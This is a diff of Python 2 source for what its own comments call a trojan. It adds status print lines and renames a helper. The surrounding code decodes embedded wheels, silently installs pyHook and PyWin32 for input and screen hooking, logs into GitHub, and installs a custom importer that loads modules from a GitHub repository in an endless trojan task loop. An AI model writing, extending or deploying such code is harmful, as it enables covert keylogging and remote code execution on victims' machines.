@@ -25,11 +25,14 @@ def get_wheel(wheel):
     file_contant = base64.b64decode(str(file_contant))
     fo.write(file_contant)
     fo.close()
-def install_and_import(package):#installed wheel files and imports the relevant thing
+def install_wheel(package):#installed wheel files and imports the relevant thing
     import importlib
     try:
+        print "[*] Checking for package %s" % package
         importlib.import_module(package)
+        print "[*] Package found %s" % package
     except ImportError:
+        print "[*] Installing package %s" % package
         pip.main(['install', package])
 
 def connect_to_github():#log into github
@@ -92,6 +95,7 @@ class GitImporter(object):#custom importer!
         try:
             print "[*] Attempting to import %s" % fullname
             importlib.import_module(fullname, package=None)
+            print "[*] Imported %s" % fullname
             return None
         except:
             return None#return nothing in case the trojan is not configured
@@ -116,10 +120,8 @@ def module_runner(module):
     # main trojan loop
 get_wheel("pyHook")
 get_wheel("PyWin32")
-#install_and_import("pyHook",["pyHook"])#cant make modules import out of github
-install_and_import("pyHook")#cant make modules import out of github
-install_and_import("PyWin32")#so installing them manualy with pip
-#install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
+install_wheel("pyHook")#cant make modules import out of github
+install_wheel("PyWin32")#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
